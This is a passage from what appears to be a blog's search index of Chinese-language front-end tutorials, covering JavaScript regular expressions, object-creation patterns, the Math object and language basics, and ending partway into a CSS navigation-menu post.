/\d&#123;3&#125;-\d&#123;2&#125;-\d&#123;4&#125;/;if(pattern.test(text))&#123; alert(&quot;yes,this is true&quot;);&#125; 0x03 使用正则表达式匹配字符串 match()受到全局行为的影响,全局搜索时，返回所有匹配值的数组。非全局时，返回第一个匹配到的值(返回的是一个类数组) 1234var str = &quot;123jsdlf123jkdf123jd&quot;;var regStr = /j/g;console.log(str.match(regStr));//返回数组:[&quot;j&quot;, &quot;j&quot;, &quot;j&quot;] search()不受全局行为的影响，只返回第一个匹配字符串所在位置的下标。 1234var str = &quot;123jsdlf123jkdf123jd&quot;;var regStr = /j/g;console.log(str.search(regStr));//返回下标:3 replace受到全局行为的影响,接收两个参数，第一是匹配项，第二个可以是字符串或者函数；全局搜索时替换全部，非全局时只会替换第一个。所有模式下返回的均是字符串。 1234var str = &quot;123jsdlf123jkdf123jd&quot;;var regStr = /j/g;console.log(str.replace(regStr,&quot;I Love You&quot;));//返回字符串:123I Love Yousdlf123I Love Youkdf123I Love Youd 0x02 特殊字符 ^ :表示字符串的开始位置 $ :表示字符串末尾危位置 {} :表示匹配次数 ? :匹配前一个表示式0次或1次 * :匹配前一个表达式0次或无穷次 + :匹配前一个表达式一次或者无穷次，等同于 {1,} [] :表示有一系列字符可供选择，只要匹配其中一个边可以了 - :表示字符的连续范围 0x04 预定义匹配模式 \d :匹配0-9之间的任意数字，[0-9] \D :匹配非数字，[^0-9] \w :匹配任意的字母，数字，下划线,[A-Za-z0-9] \W :匹配除所有的字母，数字，下划线,[^A-Za-z0-9] \s :匹配空格，制表符，断行符 \S :匹配非空格等的字符 \b :匹配单词边界 \B :匹配非单词边界 [\b]:匹配一个空格 0x05 高级匹配模式 (X):捕获括号。匹配 ‘X’ 并且记住匹配项。 1234var str = &quot;foobarfoobar&quot;var pattern = /(foo)(bar)\1\2///&apos;(foo)&apos; 和 &apos;(bar)&apos; 匹配并记住字符串 &quot;foo bar foo bar&quot; 中前两个单词。\1 和 \2 匹配字符串的后两个单词。 注意 \1、\2、\n 是用在正则表达式的匹配环节。在正则表达式的替换环节，则要使用像 $1、$2、$n 这样的语法，例如，’bar foo’.replace( /(…) (…)/, ‘$2 $1’ )。 (?:x):非捕获括号。表达式是 /foo{1,2}/，{1,2}将只对 ‘foo’ 的最后一个字符 ’o‘ 生效。如果使用非捕获括号/(?:foo){1,2}/.，则{1,2}会匹配整个 ‘foo’ 单词。 x(?=y):正向肯定查找。匹配’x’仅仅当’x’后面跟着’y’. x(?!y):正向否定查找。。匹配’x’仅仅当’x’后面不跟着’y’. 1234var pattern1 = /\d+(?!\.)/var str1 = &quot;3.123&quot;console.log(pattern1.exec(str1));//123 /\d+(?!.)/匹配一个数字仅仅当这个数字后面没有跟小数点的时候。 0x07 常用匹配算法 .* 贪心算法 *? 非贪心算法 (.*?) 内容提取]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS正则(2)常用匹配规则]]></title>
      <url>%2F2016%2F09%2F29%2FJS%E6%AD%A3%E5%88%99(2)%E5%B8%B8%E7%94%A8%E5%8C%B9%E9%85%8D%E8%A7%84%E5%88%99%2F</url>
      <content type="text"><![CDATA[0x00 常用匹配规则匹配并替换手机号12345678910111213141516171819// HTML://&lt;p&gt;&lt;input type=&quot;text&quot; id=&quot;phone&quot; value=&quot;123&quot; name=&quot;&quot;&gt;&lt;span id=&quot;alertSpan&quot;&gt;123&lt;/span&gt;&lt;/p&gt; var pattern = /^1[3456789]\d&#123;9&#125;$/;//开头必需是数字1，第二位必需是3-9之间的一个数字，末尾必需是9个数字phone.onblur = function()&#123;var patternPhone = /^1[345678]\d&#123;9&#125;$/;isTel = patternPhone.test(phone.value);// 判断是否符合规则if(isTel)&#123; var patternReplace = /(\d&#123;3&#125;)(\d&#123;4&#125;)(\d&#123;4&#125;)/; //对号码进行分段划分，3,4,4 var replaTel = (phone.value).replace(patternReplace,&quot;$1****$3&quot;); //替换第二组的内容，将其变为 **** //$1~$9 代表不同的匹配组 alertSpan.innerHTML = replaTel; &#125;&#125; 检测汉字1var pattern = /[\u4e00-\u9fa5]+/; 匹配邮箱1var patternMail = /\w+@([a-z][0-9])&#123;2,7&#125;.[a-z]&#123;2,4&#125;$/i; 检测网址1var patternUrl = /^https?:\/\/www\.\w+\.[a-z]&#123;2,4&#125;$/i; 验证密码等级1234// 验证密码强度var patternNumAndLetter = ^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]&#123;8,16&#125;$;必需是字母和数字的组合,长度为6-8位 检测IP123//ip:1-255.0-255.0-255.0-255var reg = /^(1\d&#123;2&#125;|25[0-5]|2[0-4]\d|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|25[0-5]|2[0-4]\d|[1-9]\d|[0-9])\.(1\d&#123;2&#125;|25[0-5]|2[0-4]\d|[1-9]\d|[0-9])\.(1\d&#123;2&#125;|25[0-5]|2[0-4]\d|[1-9]\d|[0-9])$///100-199 250-255 200-249 11-99 1-9 \. 过滤HTML中的标签元素123456789101112var patterTags = /&lt;[^&lt;&gt;]+&gt;/g;//匹配所有标签var patternBr = /(&lt;br\/&gt;)+/g;//匹配 &lt;br/&gt; var documentContent = document.body.innerHTML;var replceBrContent = documentContent.replace(patternBr,&quot;\n&quot;)console.log(replceBrContent)//将HTML 代码中的 &lt;br/&gt; 标签替换为 \nvar brContent = replceBrContent.replace(patterTags,&quot;&quot;);// 将所有标签替换为 &quot;&quot;document.write(brContent);// 打印带有换行符标识的文本]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS对象番外篇(1)创建对象的多种方式]]></title>
      <url>%2F2016%2F09%2F28%2FJS%E5%AF%B9%E8%B1%A1%E7%95%AA%E5%A4%96%E7%AF%87(1)%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
      <content type="text"><![CDATA[0x00 JS 对象对象在 JS 中被称为引用类型的值((在其它语言中，对象是类的实例))。JS 没有类的概念，至于对象，我们可以想象为散列表，一些键值对的组合，其值可以是数据或者函数。 所以，在物理世界中对象是指在内存中可以被标识符引用的一块区域。 我们创建一个对象的时候实际上是在内存中开辟了一块空间，而对于这个对象(这块空间)，可以使用任何的标识符去引用(reference)[也可以是指向]它。 12345678910111213var o = &#123; a: &#123; b:2 &#125;&#125;; // 两个对象被创建，一个作为另一个的属性被引用，另一个被分配给变量ovar o2 = o; // o2变量是第二个对“这个对象”的引用o = 1; // 现在，“这个对象”的原始引用o被o2替换了var oa = o2.a; // 引用“这个对象”的a属性// 现在，“这个对象”有两个引用了，一个是o2，一个是oa 0x01 使用 Object 创建对象创建自定义对象最简单的方法就是创建一个 Object 实例,然后为其添加属性和方法。 1234567var person = new Object();person.name = &quot;Jack&quot;;person.age = &quot;29&quot;;person.sayName = function () &#123; alert(this.name);&#125; 0x2 字面量创建对象除了使用 Object 实例化一个对象外，还可以使用对象字面量语法创建一个对象 1234567var person = &#123; name: &quot;Jack&quot;, age: &quot;29&quot;, sayName: function () &#123; alert(this.name); &#125;&#125;; 0x03 工厂模式工厂模式抽象了创建具体对象的过程，从而使用函数来封装以特定接口创建对象的细节。 123456789101112function createPerson (name, age, job)&#123; var o = new Object(); o.name = name; o.age = age; o.job = job; o.sayName =function ()&#123; alert(this.name); &#125;; return o;&#125;var person1 = createPerson(&quot;jack&quot;, 27, &quot;Student&quot;); 函数 createPerson() 能够根据接收的参数来创建一个包含必要信息的对象。我们可以无数次的调用这个函数去创建一个对象。 工厂模式的问题虽然工厂模式解决了创建多个相似对象的问题，也在很大程度上较少了代码量，但是工厂模式却没有解决对象识别问题。 0x03 构造函数模式Object 构造函数或者字面量可以创建单个的对象，但是使用同一接口创建很多对象时，会产生大量重复代码，即使使用 工厂模式 可以解决创建多个相似对象的问题，但没法解决对象识别问题(即是如何知道一个对象的类型)。因此一种基于工厂模式的变种出现了，构造函数模式。 12345678910function Person (name, age, job)&#123; this.name = name; this.age = age; this.job = job; this.sayName = function ()&#123; alert(this.name); &#125;; &#125;var person1 = new Person(&quot;Jack&quot;, 29, &quot;teacher&quot;);var person2 = new Person(&quot;Macl&quot;, 28, &quot;studnet&quot;); 如上，首先我们并没有显示的去创建对象，而是 new 了一个 Person() 构造函数( 为了与普通函数区分开来，构造函数首字母大写，构造函数没有 return 语句)，创建了一个 Person 实例。 任何函数，只要通过 new 操作符来调用，它就可以作为构造函数；而任何函数，如果不使用 new 调用，那它与普通函数并没有什么不同。 构造函数模型的问题使用构造函数的问题即是，每个方法都要在每个实例上重新创建一遍。比如，person1 和 person2 都用到了同一个函数，sayName()。但是那两个函数不是同一个 Funciton 实例。 当然，我们可以将构造函数内部定义的函数提取处理，在其外部从新定义，从而让其成为一个全局函数，这样 person1 和 person2 就可以共享在全局作用域中定义的同一个函数 sayName()。 但是新的问题有出现了，在全局作用域中定义的函数实际上只能被某个对象调用，更重要的是，当对象需要定义很多方法时，那么就要定义很多个全局函数，这样我们自定义的引用类型变丝毫没有封装性可言。 0x04 原型模式在JS中每个对象有拥有一个原型对象，所以在每个对象内部都有一个指向其原型对象的指针(或者属性，这个属性叫原型属性(prototype)，比如我们所创建的所有自定义对象的原型属性都会指向 Object 对象，而object 对象的原型对象是null。 123456789101112131415function Person () &#123; &#125;Person.prototype.name = &quot;jack&quot;;Person.prototype.age = 29;Person.prototype.job = &quot;teacher&quot;;Person.prototype.sayName = function ()&#123; alert(this.name);&#125;person1 = new Person();person2 = new Person();alert(person1.sayName == person2.sayName); // true 如上，将 sayName() 方法和所有属性直接添加到了 Person 的 prototype 属性中，构造函数变成了一个空函数。虽然我并没有在Person 构造函数中定义sayName() 方法，但是由构造函数创建出来的新对象实例却拥有了 sayName() 方法。而这正是因为 person 对原型对象的特殊引用。 原型对象中有一个constructor属性指向包含prototype属性的函数 当为对象实例添加一个与对象属性同名的属性时，实例中的这个属性就会屏蔽原型对象的同名属性。但是，也可以使用 delete 操作符完全删除实例属性，从而能够重新访问原型中的属性。 封装的原型我们可以使用一个包含所有属性和方法的对象字面量来重写整个原型对象，这样不但可以减少代码量，也更好的从视觉上进行了封装。但是一旦重写原型对象，那么 constructor 属性不再会指向 Person 而是指向 Object，这意味着，重写原型对象便切断了现有原型与任何之前已经存在的对象实例之间的联系。 所以我们需要将其设置回正确的值 12345678910111213function Person()&#123; &#125;Person.prototype = &#123; constructor: Person, name: &quot;jack&quot;, age: 29, job: &quot;teacher&quot;, sayName: function()&#123; alert(this.name); &#125;&#125;; 原型的动态性在调用某个属性时， JS 引擎会首先在对象实例中搜索该属性，在没有找到的情况下会继续搜索原型，即使对象实例是在为原型修改属性之前创建也不会有问题。 1234567891011function Person()&#123;&#125;var friend = new Person();Person.prototype.sayHi = function ()&#123; alert(&quot;hi&quot;);&#125;;friend.sayHi() //没有问题 但是若是重写整个原型对象，情况便不一样了 1234567891011121314151617function Person()&#123;&#125;var friend = new Person(); Person.prototype = &#123; name: &quot;jack&quot;, age: 29, job: &quot;teacher&quot;, sayName: function()&#123; alert(this.name); &#125;&#125;;friend.sayName();// error 因为重写原型对象，切断了现有原型与之前已经存在的对象实例之间的联系；它们引用的仍然是最初的原型。 原型模式的问题原型模式省略了为构造函数传递初始化参数这环节，这会使得所有实例在默认情况下获得相同的属性值；而不止于此，其最大的问题在于其共享的本质所导致的，特别是对于包含引用类型值的属性，当我们修改某一个实例对象一个特定属性时必将影响原型对象的，从而使得所有实例属性发生改变。 0x06 组合模式创建自定义对象最常见的方式就是组合使用构造函数模式和原型模式。 构造函数用于定义实例属性，而原型模式用于定义方法和共享的属性。 1234567891011121314151617181920function Person (name, age, job) &#123; this.name = name; this.age = age; this.job = job; this.friends = [&quot;jack&quot;,&quot;mac&quot;]; &#125;Person.prototype = &#123; constructior: Person, sayName: function()&#123; alert(this.name); &#125;&#125;var person1 = new Person(&quot;Nich&quot;, 20, &quot;Enginner&quot;);var person2 = new Person(&quot;Greg&quot;, 19, &quot;Student&quot;);person1.friends.push(&quot;van&quot;);console.log(person1.friends); //[&quot;jack&quot;, &quot;mac&quot;, &quot;van&quot;]console.log(person2.friends); //[&quot;jack&quot;, &quot;mac&quot;] 如上，实例属性都是在构造函数中定义的，而由所有实例共享的属性 constructor 和方法 sayName() 则是在原型定义的。 当修改了 person1.friends, 并不会影响到 person2.friens, 因为它们分别引用了不同的数组。 0x07 动态原型模式进一步，我们可以将所有信息都封装在构造函数之中，并通过构造函数初始化原型(当然，在必要的条件下)。 12345678910111213141516function Person(name, age, job)&#123; //属性 this.name = name; this.age =age; this.job = job; //方法 if (typeof this.sayName != &quot;function&quot;)&#123; Person.prototype.sayName = function ()&#123; alert(this.name); &#125; &#125; &#125;var friend = new Person(&quot;jack&quot;,18,&quot;The walking Dead&quot;);friend.sayName(); 注意构造函数中，只有在 sayName() 不存在的情况下，才会将其添加到原型中。 0x08 寄生构造模式寄生(parasitic)构造模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后返回新创建的对象。 123456789101112function Person (name, age, job)&#123; var o = new Object(); o.name = name; o.age = age; o.job = job; o.sayName = function ()&#123; alert(this.name); &#125;; retuen o; &#125; var friend = new Person(&quot;jack&quot;, 28, &quot;Enginner&quot;); 如上，除了使用 new 操作符并把使用包装的函数叫做构造函数之外，这个模式跟工厂模式一模一样。构造函数在不返回值的情况下，默认会返回新对象实例。通过在构造函数中的 return 语句可以重写调用构造函数时返回的值。 寄生构造模式可以在特殊情况下为对象创建构造函数。 值得注意的是，寄生模式下返回的对象与构造函数或者与构造函数的原型属性之间没有任何关系。构造函数返回的对象与构造函数在外边创建的对象没有什么不同。 0x09 稳妥构造函数模式所谓稳妥对象(durable object)指的是没有公共属性，而且其方法也不引用 this 的对象。此外稳妥构造模式也不会使用 new 操作符调用构造函数。 123456789101112function Person (name, age, job)&#123; var o = new Object(); o.name = name; o.age = age; o.job = job; o.sayName = function ()&#123; alert(this.name); &#125;; return o;&#125;var friend = Person(&quot;jack&quot;,28,&quot;Nojob&quot;);friend.sayName(); 如此，变量 friend 中保存的是一个稳妥对象，而除了调用 sayName() 方法以外，没有别的方法可以访问其数据成员。 稳妥构造函数模式非常适合某些安全执行环境。 与寄生构造函数一样，稳妥构造函数创建的对象与构造函数之间没有什么关系。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS对象(4)对象方法]]></title>
      <url>%2F2016%2F09%2F28%2FJS%E5%AF%B9%E8%B1%A1(4)%E5%AF%B9%E8%B1%A1%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[0x00 instanceof 属性instanceof 可以判断当前实例是否属于某个对象。 1234console.log(aSubType instanceof SubType)// trueconsole.log(aSubType instanceof SuperType)// true aSubType 是 SubType 的实例，而 SubType 对象有继承于 SuperType 对象，所以以上两个结果返回 true. Object.isPrototypeOf()使用 isPrototypeOf() 方法可以判断原型是否拥有某个实例对象。 12alert(Person.prototype.isPrototypeOf(person1);// true Object.getPrototypeOf()可以通过 Object.getPrototypeOf() 方法取得某个实例对象的原型。 12alert(Object.getPrototypeOf(person1) == Person.prototype);alert(object.getPrototypeOf(person1).name); Object.hasOwnProperty()使用 Object.hasOwnProperty() 方法可以检测一个属性是存在于实例中，还是存在于原型中,只有当给定方法存在对象实例中时，才会返回 true。 12alert(person1.hasOwnProperty(&quot;name&quot;)); //true in 操作符有两种方式使用 in 操作符，单独使用和在 for...in 循环中使用。单独使用时，in 会在通过对象能访问的属性时返回 true ， 而不论该属性存在于实例中，还是原型中。 1234alert(person1.hasOwnProperty(&quot;name&quot;));// falsealert(&quot;name&quot; in person1);// true 同时使用 hasOwnProperty() 方法和 in 操作符就可以确定属性存在于对象实例中还是原型中。 for…infor...in 方法返回所有能够通过对象访问的可枚举的属性，包括实例和原型的。 Object.keys()使用 Object.keys() 方法获得对象中所有可枚举的 实例属性。 Object.getOwnPropertyNames()如果想获得原型中的所有属性，无论属性本身是否可枚举，可以使用 Object.getOwnPropertyNames() 方法。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS引用类型(4)之Math]]></title>
      <url>%2F2016%2F09%2F28%2FJS%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B(6)%E4%B9%8B%E5%8D%95%E4%BD%93%E5%86%85%E7%BD%AE%E5%AF%B9%E8%B1%A1%2F</url>
      <content type="text"><![CDATA[0x01 Math object123456789101112131415161718192021222324252627282930function getRandomArray (max, min, countnum)&#123; randomArray[0]= parseInt(Math.random()*(max - min +1)+min); console.log(randomArray[0]); NotExits = true; var newNum; for( var i = 1;i &lt; countnum; i ++)&#123; console.log(&quot;我。。。。。。是外层第&quot; + i +&quot;次&quot;); console.log(&quot;我是数组长度&quot;+randomArray.length); newNum = parseInt(Math.random()*(max - min +1)+min); console.log(&quot;我是newNum: &quot; + newNum); for(var j = 0; j &lt; i; j ++)&#123; console.log(&quot;我是内层第&quot;+j+&quot;次&quot;); if( randomArray[j] == newNum)&#123; NotExits = false; i --; &#125; &#125; if(NotExits == true)&#123; randomArray[i] = newNum; &#125; console.log(randomArray); &#125; return randomArray; &#125; console.log(getRandomArray(4,0,5)); Math 属性12345Math.E //返回算术常量 eMath.LN2 //返回2的自然对数Math.LN10 //返回10的自然对数Math.PI //返回PIMath.SQRT2 //返回2的平方根 Math 方法 abs(x) 返回绝对值 ceil(x) 向上取整数 floor(x) 向下取整数 max(x,y,z,…) 返回参数中的最大值 min(x,y,z,…) 返回参数中的最小值 pow(x,y) 返回 x 的 y 次幂 random() 返回 [0,1) 之间的随机数 round(x) 四舍五入 sqrt(x) 返回数的平方根 生成随机数123456Math.floor(Math.random()*10));//随机返回 0~9 之间的整数Math.celi(Math.random()*10);//随机返回0~10之间的整数Math.floor(Math.random()*(10+1));//随机返回1~10之间的整数 返回两个数之间的任意多个不重复的数1234567891011121314151617181920212223242526272829var randomArray = new Array(); function generateRandom (x,y,z)&#123; if ( x &lt; y )&#123; var tmp = x; x = y; y = tmp; &#125; for ( var i = 0; i &lt; z; i ++)&#123; var newRandom = Math.floor(Math.random()*(x - y + 1)) + y; var exits = false; for( j =0 ;j &lt; i; j++)&#123; if(randomArray[j] == newRandom)&#123; exits = true; i--; break; &#125; &#125; if(!exits)&#123; randomArray[i] = newRandom; &#125; &#125; return randomArray;&#125;generateRandom(0,31,5); 随机返回两个整数数之间的数公式 1Math.floor(Math.random()*(max-min)+1))+min; 随机更改 div 的背景颜色123456789101112&lt;div id=&quot;mydiv&quot;&gt;&lt;/div&gt; &lt;button id=&quot;btnChangeDivColor&quot; onclick=&quot;changeColor()&quot;&gt;button&lt;/button&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt; function changeColor ()&#123; var red = Math.floor(Math.random()*(255+1)); var green = Math.floor(Math.random()*(255+1)); var blue = Math.floor(Math.random()*(255+1)); // mydiv.style.backgroundColor = &quot;#&quot; + red.toString(16) + green.toString(16) + blue.toString(16); mydiv.style.backgroundColor = &quot;rgb(&quot; + red + &quot;,&quot; + green + &quot;,&quot; + blue +&quot;)&quot;; &#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS极速入门]]></title>
      <url>%2F2016%2F09%2F25%2FJS%E6%9E%81%E9%80%9F%E5%85%A5%E9%97%A8%2F</url>
      <content type="text"><![CDATA[0x00 认识JSJS由三部分组成：核心(ECMAScript)，文档对象模型(DOM),浏览器对象模型(BOM). 0x01 声明 (Declatations)JS 有三种声明:var : 声明变量let : 什么块范围局部变量( block scope local variable)const : 声明一个只读常量( ready only) 用 var 或 let 声明的未赋初值的变量，值会被设定为 undefined,试图访问一个未被初始化的变量会导致一 ReferenceError 异常抛出。 undefined 值在 Bollean 环境中会被当做 false，在数值类型环境中会被转换为 NaN(Not a Number). 空值 null 在数值环境中会被当做 0 来对待；在 布尔环境中则会当做 false 0x02 JS的命名规则JS 是大小写敏感的,可以包含字母，数字，下划线，$字符，但是第一个字符不能是数字。 0x03 JS的数据类型JS中的数据类型分为7 中数据类型,六种原型的数据类型和Object(对象) 基本数据类型基本数据类型有: String , Number , Boolean , Null , Undefined,Symbol(一种新的数据类型). 对于 float 类型数据，当小数点后没有数或者只有零的时候，JS 会将浮点数自动转换成整数,以节省空间。 Object 对象 0x04 Operators 一元(目) Unary operators自增(++) and 自减(–)在没有进行赋值运算的时候，++i 和 i++ 的作用是相同的。 若是存在赋值运算，当运算符(++)在前时，先自增后赋值，运算符在后时，先赋值再自增。 1234var a=10, b = 20 , c = 30;++a;//11a++;//12var e = (++a) + (++b) + (c++) + (a++);// e = 77 ++ 的隐式转换123456789101112131415161718192021222324var box = &apos;89&apos;; box++; //box = 90 //数字类型的字符串自动转换为数字 (隐式转换)var box = `abc`; box++;//box 为NaN 尝试将字符串转换为数字，失败var box = &quot;123adf&quot;;box ++;//box 为NaNvar box = false;var box1 = &quot;false&quot;;box1++;box++;//box1 = NaN//box = 1//false 默认值为 0，自增后为1 (隐式转换)var box = 2.4;box++;//3.4 直接加1 delete Arithmetic operators常用的算术运算符有:+, -, *, /(除), %((求余)) NaN 和任何一个数运算得 NaN 数值和字符串相加，将自动转换为字符串的拼接 100/0 , 结果是 Infinity 无穷大 将一个数值类型的值转换为字符串类型 12var a = 5;a = a + &quot; &quot;; 将一个数值类型的字符串转换为数值 1234var a = &quot;5&quot;;a = a - 0;// a = a / 1;// a = a * 1; /(除)123a % &quot;&quot; //Infinitya % null //Infinitya % &quot;dfsd&quot; //NaN %(取余)123a % &quot;&quot; //NaN a % null //NaNa % &quot;dfsd&quot; //NaN JS 中对两数进行求模运算，得到的余数的符号是由被除数决定的。 Comparision operatorsJS 中的比较运算符: &gt; , &lt;,&lt;=, &gt;= , == , != , ==== , !== 等于 (==) 只是在值相等的情况下便返回 ture 全等于 (===) 只是在值和类型都匹配时才返回 true 两个数值型字符串比较，那么比较的是第一个数字的大小 1&quot;555&quot; &gt; &quot;69&quot; // flase 两个数都是字符型，则比较其 第一字符的ASCII 码的大小。 123&quot;abc&quot; &gt; &quot;abce&quot; // false&quot;d&quot; &gt; &quot;abce&quot; // ture//ASCII : a:97,b:98,c:99,d:100 两个运算数进行比较，如果有一个是数值，另一个是数值类型的字符串，则将另一个转换为数值，再比较(这里要和 + , 比如 123 + “789” 返回 “123789” 区分开)。 15 &gt; &quot;15&quot; // false 关系运算符返回的是 布尔值 Logical operators逻辑与 真真为真逻辑或 一真为真 在所有的编程语言中，非 0 值都是真值。JS 中的 false 值的情况有: false , null, NaN , undefined , 0, 空字符串。 逻辑非运算符 (!) 可以用于任何值。无论这个值是什么数据类型，这个运算符都会返回一个布尔值。它的流程是：先将这个值转换成布尔值，然后取反。 Stirng operators除了比较操作符，它可以在字符串值中使用，连接操作符（+）连接两个字符串值相连接，返回另一个字符串，它是两个操作数串的结合。 Conditional(ternary) operators条件运算符( conditional operator) 是 JS 中唯一一个三目运算符。 1conditiaon ? val1 : val2 ; Comma operator逗号操作符(,)对两个数进行求值并返回第二个操作数的值，通常用在 for 循环中。 Destructing解构赋值 destructing assignment 可以从一个数组或者对象对应的数组解构或对象字面量里提取数据。 123456789var foo = [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;];//不使用解构var one = foo[0];var two = foo[1];var three = foo[2];//使用解构var [one, two, three] = foo; typeoftypeof 操作符用来检测变量的数据类型。 12typeof operandtypeof (operand) 以上两种都是有效的 对于字面量或者变量，使用 typeof 会返回如下字符串 字符串 描述 undefined 未定义 boolean 布尔值 string 字符串 number 数字 object 对象或者null function 函数 0x05 数据类型转换显示转换Number( ) 函数Number()函数 可以将任何的非数值( string , null , boolean ,undefined)转换为数值。 1.只包含数值的字符串，会直接转成成十进制数值，如果包含前导0，即自动去掉。 2.只包含浮点数值的字符串，会直接转成浮点数值，如果包含前导和后导0，即自动去掉。 3.如果字符串是空，那么直接转成成0。 4.如果不是以上三种字符串类型，则返回NaN。 1234567891011Number(ture); //转换为 1Number(null); //转换为 0Number(undefined); //转换为 NaNNumber(false); //转换为 0Number(&quot;false&quot;); //NaNNumber(&quot;23&quot;); // 23Number(&quot;0.330&quot;); //0.33Number(&quot;&quot;); //0Number(0123); // 0 不会别忽略 自动识别为八进制 83Number(0987); // 0 被忽略 自动识别为十进制 987 parseInt(String,radix) 函数parseInt 将字符串转换为整型,从第一个数开始取，到最后一个连续数字结束，如果第一个不是数字，则返回 NaN. parseInt 除了可以识别十进制还可以识别八进制和十六进制。 parseFloat(String) 函数parseFloat 将 字符串转换成浮点数。与 parseInt 从第一位解析到非浮点数。 单目加法运算将字符串转换为数字的另一种方法是使用单目加法运算 1(+&quot;1.1&quot;)+(+&quot;1.1&quot;) = 2.2 String将一个值转换为 String 类型。 Boolean12Boolean(123);Boolean(&quot;123); 0x06 Control flow and error handling Conditional StatementsJS 有两种条件判断语句: if…else 和 switch. if…else12345678910if (condition_1) &#123; statement_1;&#125;else if (condition_2) &#123; statement_2;&#125;...else &#123; statement_n; &#125; 在 JS if 判断中，以下值将会被计算出 flase : false, undefined, null, 0, NaN, 空字符串(&quot;&quot;)。除此之外的所有内容都为 true 1if(&quot;0&quot;) &#123;console.log(&quot;ha&quot;);&#125; // &quot;ha&quot; switch…case12345678910swicth (expression) &#123; case labe_1: statements_1 [break;] ... default: statement_def [break;] !Note表达式不能是浮点型，最后一条的 case 的break可以省略，default 的位置可以交换。 当多个值的执行语句，可以只写一组执行语句 123456789101112131415swicth (expression) &#123; case labe_1: case label_2: case label_3: ... case lable_n: statements [break;] ... default: statement_def [break;] Loop StatementJS 中的循环控制语句有: for, do...while, while,for...in, label, break, continue. for...in 主要是用来操作对象的。 for12for ([initialExpression]; [condition]; [incrementExpression]) statement; initialExpression: 初始化表达式condition: 条件表达式statement: 需要执行的语句incrementExpression: 累计表达式 do…while123do statementwhile (condition); while12while (condition) statement 标签语句 label statement标签语句提供一种使我们可以在同一程序的另一处找到它的标识。比如可以用一个标识来识别一个循环，并使用 break 或者 continue 来说明一个程序是否要中断这个循环或者继续执行。 12lable: statement; label 可以是 JS 中任意的非保留的标识符。 Object Manipulation StatementsJS 中的对象操作语句有 for...in, for...each, with. for…infor...in 语句迭代一个指定的变量去遍历这个对象的属性，每个属性，JS 执行特定的语句。 123for (variable in object) &#123; statements&#125; for each…infor each...in 类似于 for..in 语句，但是它得到的是对象属性的值，而不名字。 0x09 Numbers and datesJS 中，数字都是 double float 的，一个数字的表示范围只能是在(-(2^53-1)~2^53-1)之间的。没有特定的数字类型为整型。除了能够表示浮点数，数字类型有三个符号值: +Infinity、-Infinity和 NaN (not-a-number)。 数字的常用方法 方法 描述 Number.parsrFloat() Number.parseInet() Number.isFinite() 判断传递的值是否为有限数字 Number.isInteger() 判断传递的是否为整数 Number.iNaN() 判断传递的值是否为NaN Number.isSafeInteger() 判断传递的值是否为安全整数 Number.toExponential() 返回一个指数形式的字符串 Number.toFixed() 返回指定小数位数的形式 Number.toPrecision() 返回一个指定精度的数字。有可能损失精度 Math object我们不可以创建一个自己的 Math 对象，而只能使用系统内建的 Math 对象。 方法 描述 abs 绝对值 sin(),cos(),tan() 标准三角函数 pow(),exp(),log10() 指数与对数 min(),max() 返回逗号分隔的数组中的最大值、最小值 random() 返回0和1之间的随机数 round(),fround(),trunc() 四舍五入和截断函数 sqrt(),cbrt() 平凡根，立方根 sign() 数字的符号，说明数字是否为正，负，零]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[CSS界面组件之导航菜单]]></title>
      <url>%2F2016%2F09%2F17%2FCSS%E7%95%8C%E9%9D%A2%E7%BB%84%E4%BB%B6%E4%B9%8B%E5%AF%BC%E8%88%AA%E8%8F%9C%E5%8D%95%2F</url>
      <content type="text"><![CDATA[0x00 纵向菜单代码示例: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin:0; padding:0; &#125; nav&#123; margin: 50px; width: 200px; &#125; .list ul&#123; border:1px solid #6a6bbc; border-radius: 3px; padding:5px 10px 3px; &#125; .list li&#123; list-style:none; &#125; .list li+li a &#123; border-top:1px solid #6a6bbc; &#125; .list a&#123; padding: 3px 10px; text-decoration: none; display: block; &#125; .list a:hover&#123; background-color: #069; color:white; font: 20px/1em &quot;宋体&quot;; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;nav class=&quot;list&quot;&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;APP&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Contents&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;About&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt;&lt;/body&gt;&lt;/html&gt; 注释: 使用 非首位子元素 选择符。li + li 选择符意思为：任何跟在 li 之后的 li。在上面表示给除第一个 li 之外的所有列表项上方加一条边框。 其它实现效果: 123456.list li&#123; border-top:1px solid #069;&#125;.list li:first-child&#123; border-top:none;&#125; 让列表可点击。为了不让只有文本可以点击（因为链接 a 是行内元素，它会收缩并包住其中的文本。），为了提高用户体验，我们需要 让列表项所在的整行都能点击。方法就是首先把内边距从 li 元素转移到链接内部，然后让链接完全填满整个列表项。 0x01 横向菜单代码示例: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; 